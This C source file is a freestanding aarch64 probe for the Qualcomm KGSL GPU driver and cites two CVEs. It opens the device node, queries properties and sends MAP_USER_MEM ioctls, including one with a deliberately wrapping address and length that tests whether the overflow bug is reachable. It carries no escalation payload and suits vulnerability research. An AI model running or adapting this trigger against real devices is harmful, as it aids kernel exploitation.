/*
 * kgsl_probe.c - non-destructive reachability/response probe for the KEYone
 * Adreno 506 KGSL SVM-region path (CVE-2020-11261 / CVE-2023-33107 class).
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_probe kgsl_probe.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_device_getproperty{u32 type;void*value;u64 sizebytes;};
#define IOCTL_KGSL_DEVICE_GETPROPERTY IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x02,sizeof(struct kgsl_device_getproperty))
struct kgsl_drawctxt_create{u32 flags;u32 ctxid_out;};
#define IOCTL_KGSL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_map_user_mem{int fd;u32 pad;u64 gpuaddr;u64 len;u64 offset;u64 hostptr;u32 memtype;u32 flags;};
#define IOCTL_KGSL_MAP_USER_MEM IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x15,sizeof(struct kgsl_map_user_mem))
void _start(void){
 long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
 out("[*] open /dev/kgsl-3d0 = ");outdec(fd);out("\n");
 if(fd<0){out("[!] gated\n");sys3(SYS_exit,1,0,0);return;}
 u32 info[8];for(int i=0;i<8;i++)info[i]=0;
 struct kgsl_device_getproperty gp;gp.type=1;gp.value=info;gp.sizebytes=sizeof(info);
 long r=sys3(SYS_ioctl,fd,IOCTL_KGSL_DEVICE_GETPROPERTY,(s64)&gp);
 out("[*] GETPROPERTY ioctl=");outhex(IOCTL_KGSL_DEVICE_GETPROPERTY);out(" ret=");outdec(r);out(" chipid=");outhex(info[1]);out(" cores=");outhex(info[2]);out("\n");
 struct kgsl_drawctxt_create dc;dc.flags=0;dc.ctxid_out=0;
 r=sys3(SYS_ioctl,fd,IOCTL_KGSL_DRAWCTXT_CREATE,(s64)&dc);
 out("[*] DRAWCTXT_CREATE ioctl=");outhex(IOCTL_KGSL_DRAWCTXT_CREATE);out(" ret=");outdec(r);out(" ctxid=");outhex(dc.ctxid_out);out("\n");
 struct kgsl_map_user_mem m;
 for(u64 i=0;i<sizeof(m);i++)((u8*)&m)[i]=0;
 m.fd=-1;m.memtype=2;m.gpuaddr=0x100000000ull;m.len=0x1000;
 r=sys3(SYS_ioctl,fd,IOCTL_KGSL_MAP_USER_MEM,(s64)&m);
 out("[*] MAP_USER_MEM ioctl=");outhex(IOCTL_KGSL_MAP_USER_MEM);out(" benign ret=");outdec(r);out(" gpuaddr_out=");outhex(m.gpuaddr);out("\n");
 for(u64 i=0;i<sizeof(m);i++)((u8*)&m)[i]=0;
 m.fd=-1;m.memtype=2;m.gpuaddr=0x100000000ull;m.len=0x2000000;
 r=sys3(SYS_ioctl,fd,IOCTL_KGSL_MAP_USER_MEM,(s64)&m);
 out("[*] MAP_USER_MEM hugelen(32MB) ret=");outdec(r);out(" gpuaddr_out=");outhex(m.gpuaddr);out("\n");
 for(u64 i=0;i<sizeof(m);i++)((u8*)&m)[i]=0;
 m.fd=-1;m.memtype=2;m.gpuaddr=0x700204000ull;m.len=0xffffffffffefd000ull;
 r=sys3(SYS_ioctl,fd,IOCTL_KGSL_MAP_USER_MEM,(s64)&m);
 out("[*] MAP_USER_MEM wraparound ret=");outdec(r);out(" gpuaddr_out=");outhex(m.gpuaddr);out("\n");
 out("[*] done (no exploitation)\n");
 sys3(SYS_close,fd,0,0);sys3(SYS_exit,0,0,0);
}
